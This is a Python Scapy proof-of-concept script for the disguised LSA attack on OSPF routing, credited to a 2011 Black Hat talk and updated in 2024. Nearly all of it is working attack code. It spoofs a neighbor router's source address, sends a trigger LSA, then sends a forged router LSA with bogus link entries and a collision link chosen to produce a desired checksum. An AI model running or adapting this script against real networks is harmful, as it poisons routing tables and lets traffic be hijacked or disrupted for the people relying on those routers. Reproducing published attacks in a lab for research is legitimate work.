#!/usr/bin/env python
"""
Disguised LSA OSPF Attack Proof of Concept
Author:	Gabi Nakibly
Date:	2011.8.4

Updated by: Leo Åkerberg & Viktor Johansson Baurne
Date: 2024.03.19
Original version downloaded from blackhat.com: https://www.blackhat.com/html/bh-us-11/bh-us-11-archives.html
"""

from scapy.all import *
import time
load_contrib('ospf')

def ourSend(packet):
    sendp(packet)

victim='10.0.2.1'    		 #This is the IP address of interface through which the victim will receive the trigger LSA. 
victimId='1.1.1.3'		     #This the router ID of the victim router.
victimNeighbor='10.0.0.2'	 #This is the IP address of a neighbor of the victim router to which the disguised LSA is sent
spoofSRC='10.0.0.1'			 #This is an IP address of one of the neighbors of the victim. It is used as a spoofed IP source. 
host1='10.0.4.1'		 #This will used in the bogus Link entries in the disguised LSA.
host2='10.0.5.1'		 #This will used in the bogus Link entries in the disguised LSA.
sequence=0x800010a0				 #The sequence number of the disguised LSA

#The bogus Link entries to be included in the disguised LSA. The contents of the last link (collisionLink) is chosen 
# so that the LSA will have a specific checksum desirable to our network example (0x2028 in this example). 
link2host1 = OSPF_Link(id=host1,data='255.255.255.255',type=3)
link2host2 = OSPF_Link(id=host2,data='255.255.255.255',type=3)
link2victim = OSPF_Link(id=victimId,data=victim,type=2)
# The metric for the collision link is calculated offline
collisionLink = OSPF_Link(id='0.0.0.0',data='0.0.0.0',type=0,toscount=0,metric=156)

# Build the trigger LSA. Note that it is sent with sequence number that is smaller by one from the sequence of the disguised packet.
IPlayer=IP(src=spoofSRC,dst=victim)
OSPFHdr=OSPF_Hdr(src='1.1.1.3')
trigger=Ether(dst="00:00:00:aa:00:03")/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence-1,linkcount=3,linklist=[link2victim,link2host1,link2host2])])

#Buid the disguised LSA
IPlayer=IP(src='10.0.1.2',dst='10.0.1.1')
OSPFHdr=OSPF_Hdr(src=victimId)
disguisedLsa=Ether(dst="00:00:00:aa:00:01")/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence,linkcount=3,linklist=[link2victim,link2host1,link2host2,collisionLink])])
#Send them both 
ourSend(trigger)
ourSend(disguisedLsa)
